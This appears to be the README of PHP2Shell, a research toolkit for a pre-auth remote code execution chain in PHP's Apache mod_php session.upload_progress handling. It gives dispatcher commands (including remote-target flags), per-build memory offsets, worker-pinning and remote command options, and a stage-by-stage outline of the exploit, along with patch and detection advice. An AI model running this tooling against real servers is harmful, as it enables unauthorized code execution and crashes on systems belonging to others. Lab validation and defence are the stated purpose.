# PHP2Shell

**Pre-auth RCE research toolkit for CVE-2026-109618 / CVE-2026-109619**

`exploit by devploit`

![A verified PHP2Shell run against the PHP 8.5.11 laboratory](docs/images/php2shell-run.webp)

*Verified run against the local PHP 8.5.11 laboratory: `uid=33(www-data)`.*

> **Authorized testing only.** Use this material exclusively against systems you
> own or have explicit, written permission to test. It is not a scanning tool,
> it ships no target list, and it must not be used against third-party
> infrastructure. The chain is disruptive: it sends large request bodies,
> triggers pre-RINIT out-of-memory conditions and kills Apache children.

PHP2Shell is a research workspace for the `session.upload_progress` OOM /
stale-pointer chain in PHP's Apache module. It packages a version-aware
dispatcher, a per-build profile engine, reproducible laboratories, a calibration
factory and runtime instrumentation around the public research exploit by
[9bie](https://github.com/9bie/php2shell-bypass-aslr-exp).

The goal is reproducible research and defensive validation, not mass
exploitation. The dispatcher refuses to guess: it stops when the build has no
verified profile, when the target is a fixed release, or when the target OS does
not match the profile.

---

## Status

| Build | Image | Profile | Heap leak | libphp leak | RCE | Notes |
| --- | --- | --- | --- | --- | --- | --- |
| PHP 8.5.11 aarch64 | `php:8.5.11-apache` | `php-8.5.11-bookworm-aarch64` | yes | yes | **yes** | `uid=33(www-data)` |
| PHP 8.5.11 amd64 | `php:8.5.11-apache` | `php-8.5.11-bookworm-amd64` | yes | yes | **yes** | separate offsets, same `htdata` |
| PHP 8.5.10 aarch64 | `php:8.5.10-apache` | `php-8.5.10-bookworm-aarch64` | yes | yes | **yes** | `uid=33(www-data)` |
| PHP 8.4.26 amd64 | `php:8.4.26-apache` | `php-8.4.26-bookworm-amd64` | yes | yes | **yes** | reference build |
| PHP 8.4.26 deb13/apxs2 amd64 | source build (Debian 13, Apache 2.4.69 apxs2) | `php-8.4.26-deb13-apxs2-amd64` | yes | yes | **yes** | third stage-3 layout; instance-dependent; requires `--profile deb13-apxs2` |
| PHP 8.4.25 aarch64 | `php:8.4.25-apache` | `php-8.4.25-bookworm-aarch64` | yes | yes | **yes** | probabilistic stage 3; retries |
| PHP 8.5.0 aarch64 | `php:8.5.0-apache` | `php-8.5.0-bookworm` | yes | yes | no | stage-3 layout not found |
| PHP 8.3.35 aarch64 | `php:8.3.35-apache` | `php-8.3.35-bookworm-aarch64` | yes | yes | no | stage-3 reference alive |
| PHP 8.3.33 mod_php | `wordpress:7.1.1-apache` | `php-8.3.33-wordpress-mod_php` | yes | yes | no | stage-3 reference alive |
| PHP 8.3.0 aarch64 | `php:8.3.0-apache` | `php-8.3.0-bookworm` | no | no | no | `PS(id)` dangling; cookie not reclaimed |
| PHP 8.2.34 aarch64 | `php:8.2.34-apache` | `php-8.2.34-bookworm-aarch64` | no | no | no | UAF; leak shape differs |
| PHP 8.1.34 aarch64 | `php:8.1-apache` | `php-8.1.34-bookworm-aarch64` | no | no | no | UAF; leak shape differs |
| PHP 8.0.30 aarch64 | `php:8.0-apache` | `php-8.0.30-bookworm-aarch64` | no | no | no | UAF; leak shape differs |
| PHP 7.4.33 aarch64 | `php:7.4-apache` | `php-7.4.33-bookworm-aarch64` | no | no | no | UAF; leak shape differs |
| PHP 8.2.0 aarch64 | `php:8.2.0-apache` | — (offsets only) | n/a | n/a | no | no heap profile |

**14 heap profiles, 6 with verified RCE. Offsets extracted for 12 builds.**

`Heap leak` is stage 1, `libphp leak` is stage 2 and `RCE` is a real command
proof on an isolated lab. `no` means not verified, not necessarily impossible;
`n/a` means no heap profile exists for that build. The 8.2.0 row is an
offsets-only entry. All `yes` rows use the lab configuration: Apache prefork
`mod_php`, one worker, `display_errors=On`, `memory_limit=8M` and
`session.upload_progress=On`. Per-image offsets and `libphp` sha256 are in
[the offset inventory](docs/offset-inventory.md). The 8.4.25 profile needs the
default retries because its stage 3 is probabilistic. The 8.4.26 deb13/apxs2
row is a **contributor-reported, not independently confirmed source build**,
not an official image: its stage-3 phase is instance-dependent (the contributor reported 4/4 runs on one Apache master and
0/5+ on others), so treat `rce: true` as “reproduced on the reporter's lab” and
retry on a fresh worker/master. Because two 8.4.26 amd64 profiles exist, the
dispatcher requires `--profile deb13-apxs2` for this build.

## Features

- **Version-aware dispatch** — fingerprints the target, rejects fixed releases,
  selects the exact build profile and passes offsets, `htdata` and heap
  parameters explicitly. `--php-version` covers servers that hide their version;
  `--arch` selects aarch64 or amd64 (auto-detected for local containers,
  required for remote targets), and `--profile` forces an exact build.
- **Memory-limit probe** — one request reveals the target `memory_limit` from
  the fatal message; the chain then runs once instead of sweeping every value.
- **Worker pinning** — keeps N-1 prefork workers busy with idle keep-alive
  connections so the whole chain lands on one process. Automatic for loopback
  laboratories; opt-in for remote infrastructure.
- **Proof handling** — reads the container's `/out` mount for local targets, or
  fetches a web-accessible output path for remote targets. `--fetch` and
  `--no-fetch` override it.
- **Command staging** — on local labs `-c` accepts commands of any length,
  stages them in `/out/c` and captures the output. `--script` and `--interactive`
  provide batch and REPL modes.
- **Calibration factory** — `php2shell_calibrate.py` discovers stages 1-2 and
  verifies stage 3 with a real proof before writing `rce: true`;
  `php2shell_matrix.py` runs the factory over a matrix of images.
- **Laboratories and instrumentation** — disposable labs per build, `/proc`
  memory oracle, gdb recipes and offset extraction for arbitrary images.

## Quick start

Requirements: Python 3.11+, Docker (for the labs), Linux or macOS on arm64 or
amd64. Fetch the pinned upstream:

```sh
python3 tools/bootstrap_upstream.py
```

The script clones the public 9bie research into `vendor/php2shell-upstream` and
checks out the pinned commit. The toolkit applies the minimal SNI and
heap-parameter changes in place at runtime; they are documented in
[docs/upstream-changes.md](docs/upstream-changes.md). No patch file is
redistributed.

Start the local laboratories and run the dispatcher against the PHP 8.4.26 lab:

```sh
python3 tools/php2shell_labs.py up
python3 tools/php2shell_auto.py \
  -u http://127.0.0.1:8105/index.php \
  --container p2s-lab-8426 \
  --repo-dir vendor/php2shell-upstream
```

Expected shape:

```text
  exploit by devploit  ·  CVE-2026-109618 / CVE-2026-109619
  automatic target detection, build profile dispatch and command execution
  authorized testing only

[*] CHAIN 01/01  automatic target detection / fixed command proof
00:00.00  DISCOVER   http://127.0.0.1:8105/index.php
00:00.01  OK         PHP 8.4.26  ·  Apache/2.4.69 (Debian)
00:00.01  PREFLIGHT  php-8.4.26-bookworm-amd64
00:00.15  PROBE      memory_limit probe: 16 MiB body
00:00.16  OK         detected memory_limit=8M
00:00.17  EXECUTE    memory_limit=8M  ·  huge_mb=12
   │ [+] chunk base = 0x7ffffc400000
   │ [+] libphp base = 0x7ffffe013000
   │ PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)

╭─ RESULT ─────────────────────────────────────────────────────────╮
│ PRE-AUTH RCE CONFIRMED                                           │
╰──────────────────────────────────────────────────────────────────╯
```

Useful entry points:

```sh
python3 tools/php2shell_auto.py --list          # profiles and RCE status
python3 tools/php2shell_auto.py -u <target> --dry-run --no-color
python3 tools/php2shell_auto.py -u <target> --php-version 8.4.26 --arch amd64 --allow-remote
python3 tools/php2shell_labs.py status
python3 tools/php2shell_inventory.py
```

## How it works

The chain abuses the `session.upload_progress` callback that runs **before**
the request startup (pre-RINIT) and therefore before the target script:

1. **Stage 1 — heap leak.** A multipart request drives the parser into an
   out-of-memory bailout after `php_session_track_init()` built the session
   state. The next request reuses the stale `PS(id)` and returns a
   `Set-Cookie` whose value contains heap pointers, revealing the Zend MM chunk
   base.
2. **Stage 2 — libphp leak.** The same stale-state primitive is reshaped to
   disclose a pointer into `libphp.so`, revealing its load base.
3. **Stage 3 — control flow.** A forged HashTable/reference lands on the stale
   session state; the `zval_ptr_dtor` path calls `zif_system` with a short
   command carried in a fake `zend_string`.

The full technical write-up, including the session lifecycle and the heap
grooming, is in [docs/php2shell-analysis.md](docs/php2shell-analysis.md).

A profile is per build:

```json
{
  "libphp": { "zif_system": "0x465370", "zval_ptr_dtor": "0x65eb60", "htdata": "0x690d8" },
  "stages": { "stage1_n": 841, "stage1_forge_len": 79, "stage2_t": 406,
              "stage2_v": 16, "stage3_pads": [[31, 31]], "stage3_carrier": true },
  "oom_mb": 12,
  "rce": true
}
```

## Architecture selection

Some versions ship more than one build. PHP 8.5.11 has separate aarch64 and amd64
offsets:

- local container: the dispatcher reads `uname -m` and selects the matching
  profile automatically;
- remote target: `--arch aarch64|amd64` (or `--profile NAME`) is **required**,
  even when the version has a single profile. HTTP does not expose the CPU
  architecture, so the dispatcher refuses instead of guessing.

## Configuration requirements

The shipped calibration targets:

- Apache prefork + `mod_php` with **one worker**;
- `display_errors=On`, `memory_limit=8M`, `max_input_vars=1000`;
- `session.upload_progress.enabled=On`, `session.use_cookies=1`,
  `session.use_strict_mode=0`.

A hardened production PHP (128M+, `display_errors=Off`, multiple workers, FPM)
does not match the shipped calibration. Multi-worker targets are handled with
`--pin-workers`; `display_errors=Off` and FPM remain open research items (see
Limitations).

## Multi-worker targets

The stale session state is per worker. Without pinning, stage 1's A/B requests
land on different children and the leak fails:

```sh
--pin-workers 4        # hold 3 workers with keep-alive, leave one free
--pin-workers auto     # loopback default: count workers in the container
--no-pin-workers       # disable pinning
```

For loopback targets the count is detected automatically. For remote targets
pinning is **opt-in**: it opens keep-alive connections until a request stops
being answered, which is intrusive and only appropriate on authorized
infrastructure. `--pin-max N` bounds the connections (default 32).

## Commands and proof

A remote `-c` command is limited to 14 bytes (the fake `zend_string` carrier).
On a local lab the dispatcher stages the command in `/out/c`, runs
`sh</out/c` and captures the output:

```sh
-c 'id'                       # short
-c 'id; uname -a; whoami'     # any length on a local lab
--script ./cmd.sh             # batch
--interactive                 # REPL; one full chain per command
```

Local targets read the container's `/out` mount directly. Remote targets use
`id>p1` and fetch `/p1` automatically; `--fetch PATH` overrides and
`--no-fetch` disables the read-back. A remote command that writes outside the
webroot, or a server that does not serve the file, will execute blind: no proof
does not necessarily mean no execution.

## Speed

The dispatcher probes the target `memory_limit` from one request's fatal
message. Measured locally: **7.0 s** for 8M and **13.5 s** for 128M (probe +
one chain), versus several minutes for a blind sweep.

```sh
--memory-limit-mb 128   # skip the probe
--retries 1             # fewer attempts (stage 3 uses retries+2)
--no-pre-rotate         # skip the initial rotation
--no-retry-rotate       # no rotation between failures
--no-probe              # disable the probe
```

## Upstream integration

The chain itself is the public research by 9bie. The upstream repository has no
explicit license, so its source is **not vendored** in this repository. Instead:

- `tools/bootstrap_upstream.py` clones it into `vendor/php2shell-upstream`
  (git-ignored) and pins commit `4586f5c`;
- `tools/php2shell_upstream.py` applies the minimal changes in place at
  runtime: SNI on the HTTPS path and the `P2S_STAGE1_N` / `P2S_FORGE_LEN` /
  `P2S_STAGE2_T` / `P2S_STAGE2_V` overrides;
- [docs/upstream-changes.md](docs/upstream-changes.md) records the same changes
  for manual use, and [docs/licensing.md](docs/licensing.md) explains why no
  patch is redistributed;
- `tools/php2shell_paths.py` resolves the checkout, so `--repo-dir` defaults to
  `vendor/php2shell-upstream` when present and falls back to `/tmp/php2shell-rce`.

If you prefer a git dependency, use a submodule instead of the bootstrap:

```sh
git submodule add https://github.com/9bie/php2shell-bypass-aslr-exp vendor/php2shell-upstream
git -C vendor/php2shell-upstream checkout 4586f5c
# the toolkit applies the documented runtime changes in place
```

## Repository layout

```text
catalog/vulnerable.json        vulnerable branches and fixed releases
.github/workflows/ci.yml       tests and gitleaks
profiles/*.json                heap profiles (offsets, heap params, verified flag)
profiles/offsets/*.json        ELF symbol offsets per image
vendor/                        generated upstream checkout (git-ignored)
tools/
  php2shell_auto.py            version-aware dispatcher
  php2shell_calibrate.py       profile generator with proof verification
  php2shell_matrix.py          profile factory over image tags
  php2shell_rce.py             manual upstream launcher
  php2shell_assess.py          exposure/leak assessment (no RCE claim)
  php2shell_labs.py            disposable local laboratories
  php2shell_offsets.py         ELF offset extraction for any image
  php2shell_inventory.py       profile/offset table
  php2shell_paths.py           upstream checkout resolution
  php2shell_upstream.py        in-place SNI/heap-parameter changes
  bootstrap_upstream.py        fetch and pin the upstream
  php2shell_ui.py              terminal UI
lab/
  wordpress/                   WordPress 8.3.33 + mod_php laboratory
  rce/                         single-worker calibration lab and configs
docs/
  php2shell-analysis.md        technical analysis
  rce-guide.md                 full RCE guide and profile schema
  exploit-report.md            laboratory results
  labs.md                      laboratory reference
  safe-lab.md                  harmless OOM laboratory
  profile-inventory.md         profile table
  offset-inventory.md          libphp offsets per build
  inventory-growth.md          coverage roadmap
  branch-notes.md              per-branch findings
  upstream-changes.md          manual record of the runtime changes
  licensing.md                 MIT and upstream licensing notes
  instrumentation/             /proc oracle and gdb recipes
  es/                          Spanish originals
```

## Laboratories and calibration

```sh
python3 tools/php2shell_labs.py up      # 7.4.33 ... 8.5.11 on :8100-:8106
python3 tools/php2shell_labs.py test    # run the dispatcher against each lab
python3 tools/php2shell_labs.py down
```

Every lab binds to `127.0.0.1`, runs one worker with the calibration
`php.ini`/`apache.conf` and mounts an `/out` directory for proof collection.

Generate a profile for a new build:

```sh
python3 tools/php2shell_calibrate.py \
  --target http://127.0.0.1:8105/index.php \
  --container p2s-lab-8426 \
  --repo-dir vendor/php2shell-upstream \
  --proof-file lab/rce/out/8.4.26/p1 \
  --distro bookworm
```

`--distro`, `--arch` and the image tag determine the profile name. Stage 1 and
2 are discovered automatically; stage 3 is attempted with the known layouts and
`rce: true` is written only after a real command proof.

## Instrumentation

`docs/instrumentation/` contains a read-only `/proc/<pid>/mem` oracle
(`mem_dump.php`, `id_dump.php`), the `ps_globals` offsets for every build and
gdb recipes used to inspect the session reference, the fake HashTable and the
OOM path. The native-amd64 recipes cover Apache under gdb with `SYS_PTRACE` and
`zend_mm_heap` offsets.

The oracle is how the branch findings were measured: for example, on 8.3.35 the
session reference is still alive (`refcount=2`, `val.type=IS_ARRAY`) after the
OOM, which is why the 8.4/8.5 stage-3 carrier does not transfer.

## Detection and defense

- **Patch.** CVE-2026-109618 / CVE-2026-109619 are fixed in the releases listed
  in [catalog/vulnerable.json](catalog/vulnerable.json) (8.4.27 and 8.5.12 for
  the 8.4/8.5 branches). Verify against the current PHP advisories.
- **Disable what you do not use.** `session.upload_progress.enabled=Off` removes
  the pre-RINIT callback this chain depends on. If upload progress is required,
  restrict it to endpoints that actually need it.
- **Raise the bar.** `display_errors=Off` blocks the shipped stage-1 leak (an
  alternative path is research, not a shipped feature). A realistic
  `memory_limit` and a read-only webroot make proof collection harder; they are
  not fixes.
- **Reduce worker state reuse.** Keep session state per application and avoid
  sharing session storage across trust boundaries.
- **Detect.** Watch for multipart requests with ~1000 fields, very large bodies,
  repeated OOM/500 responses, Apache child crashes and `zend_mm_heap corrupted`
  log lines. Rate-limit large multipart bodies at the edge.
- **Least privilege.** Run PHP as an unprivileged user with a read-only
  document root and no shell access where possible.

## Limitations

- **mod_php prefork only.** PHP-FPM has a different lifecycle; the chain does
  not transfer as-is and FPM is not supported.
- **One worker / pinning.** Without pinning, the per-worker session state breaks
  stage 1.
- **Per-build offsets.** A profile is tied to a `libphp.so` build; the same
  version from another distribution or architecture needs its own offsets and
  heap calibration.
- **`display_errors=Off` is not complete.** The OOM-in-cookie primitive is
  reproducible in research, but the stage-1 leak is not shipped for that
  configuration.
- **`expose_php=Off` changes stage 3.** Hiding `X-Powered-By` shifts the startup
  heap; the known stage-3 pads do not fit and a dedicated calibration is needed.
- **8.5.0 / 8.3.0** have leaks or UAF preconditions but no verified stage 3.
- **8.4.25** is probabilistic; use the default retries.
- **Remote proof is not guaranteed.** `id>p1` only works if the webroot is
  writable and the file is served at `/p1`.
- **HTTPS transport is experimental.** The verified runs use HTTP. The chain's
  HTTPS path did not reproduce stage 1 against direct Apache SSL or proxied labs
  in testing, even though SNI and the unverified context are applied. Treat
  remote HTTPS as unverified until a native end-to-end proof exists.

## Documentation

- [Technical analysis](docs/php2shell-analysis.md)
- [RCE guide and profile schema](docs/rce-guide.md)
- [Laboratory results](docs/exploit-report.md)
- [Laboratories](docs/labs.md)
- [Safe OOM laboratory](docs/safe-lab.md)
- [Profile inventory](docs/profile-inventory.md)
- [Offset inventory](docs/offset-inventory.md)
- [Coverage roadmap](docs/inventory-growth.md)
- [Per-branch notes](docs/branch-notes.md)
- [Instrumentation](docs/instrumentation/README.md)
- [Reproducibility](docs/reproducibility.md)
- [Contributing](CONTRIBUTING.md)
- [Acceptable use](ACCEPTABLE_USE.md)
- [Upstream changes](docs/upstream-changes.md)
- [Licensing](docs/licensing.md)

## Ethics and acceptable use

This project exists for authorized security testing, defensive validation and
reproducible research. The full policy is in
[ACCEPTABLE_USE.md](ACCEPTABLE_USE.md).

- Do not use it against systems you do not own or have written permission to
  test. A public website is not a laboratory.
- Do not use the remote worker-saturation mode against third-party
  infrastructure; it is intrusive.
- Do not build or distribute target lists, mass-exploitation tooling or
  infrastructure for denial of service.
- Respect the law and the terms of any program you participate in.
- If you find a new affected build, prefer coordinated disclosure with the
  vendor and the PHP security team.

The authors accept no liability for misuse or damage. The license does not grant
authorization to test any system.

## Contributing

Contributions are welcome when they improve reproducibility. Read
[CONTRIBUTING.md](CONTRIBUTING.md) for the profile workflow, tests and the pull
request checklist.

Examples:

- new build profiles with a real proof and the exact image/tag;
- laboratory fixes, offset extraction for new distros/architectures;
- documentation, detection guidance and defensive tooling;
- calibration improvements for the open configurations
  (`display_errors=Off`, `expose_php=Off`, FPM).

Please do not include real target data, credentials, or logs from systems you do
not own. Open an issue or a pull request with the profile, the evidence and the
commands used.

Run the suite before opening a pull request:

```sh
python3 -m unittest discover -s tests -v
```

## Credits

- **Wiz Research** — discovery and public analysis of PHP2Shell
  (CVE-2026-109618 / CVE-2026-109619):
  [blog](https://www.wiz.io/blog/php2shell-php-rce) and
  [technical video](https://youtu.be/H7JWNiQpaT8). The analysis in this
  repository starts from that publication.
- **Calif** — parallel research and the upload-metadata amplification analysis
  referenced in [docs/php2shell-analysis.md](docs/php2shell-analysis.md):
  [calif.io/php2shell](https://calif.io/php2shell/).
- **9bie** — original public PHP2Shell exploit and heap-grooming research:
  stage-1/2 leaks, the stage-3 fake HashTable carrier and the
  [php2shell-bypass-aslr-exp](https://github.com/9bie/php2shell-bypass-aslr-exp)
  codebase. The upstream is fetched by `tools/bootstrap_upstream.py` and the
  runtime changes are documented in
  [docs/upstream-changes.md](docs/upstream-changes.md).
- **Karasawa2025** — public research on the `display_errors=Off` direction:
  the OOM-in-cookie primitive, page-level grooming and the alternative leak
  strategy that this repository is still calibrating.
- **WoYinDao** — public CVE-2026-109618 analysis: session lifecycle, the
  pre-RINIT OOM window, the `var_destroy` reentry UAF and the cross-branch
  negative matrix.
- **PHP security team, PHP Foundation and release maintainers** — advisory,
  fixes in 8.4.27, 8.5.12 and the branch releases, and the security release
  notes at [php.net/security](https://www.php.net/security/), with the
  [PHP Foundation note](https://thephp.foundation/blog/2026/10/21/todays-php-security-release-and-how-were-strengthening-php-security/).
- **devploit** — version-aware dispatcher, profile factory, laboratories,
  instrumentation, tests and documentation.

This toolkit does not claim discovery of the CVE. If a credit is missing or
inaccurate, please open an issue.

## License

MIT for the original code. See [LICENSE](LICENSE) and
[docs/licensing.md](docs/licensing.md) for the upstream boundary. The license
grants copyright permissions only; it does not authorize testing any system.
